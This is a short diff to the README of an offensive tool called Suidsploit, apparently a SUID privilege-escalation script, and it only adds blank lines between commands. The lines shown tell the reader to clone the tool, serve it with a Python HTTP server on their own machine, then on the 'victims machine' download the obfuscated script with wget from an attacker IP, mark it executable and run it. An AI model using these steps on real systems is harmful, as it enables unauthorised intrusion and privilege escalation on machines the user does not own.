@@ -21,7 +21,9 @@ On your machine:
 
 
 $ git clone https://github.com/S1lkys/Suidsploit.git
+
 $ cd Suidsploit/
+
 $ python -m SimpleHTTPServer 80
 
 
@@ -32,7 +34,9 @@ On victims machine:
 
 
 $ wget http://192.168.xxx.xxx/Suidsploit.ob.sh
+
 $ chmod +x Suidsploit.ob.sh
+
 $ bash Suidsploit.ob.sh
 ### Todos
 
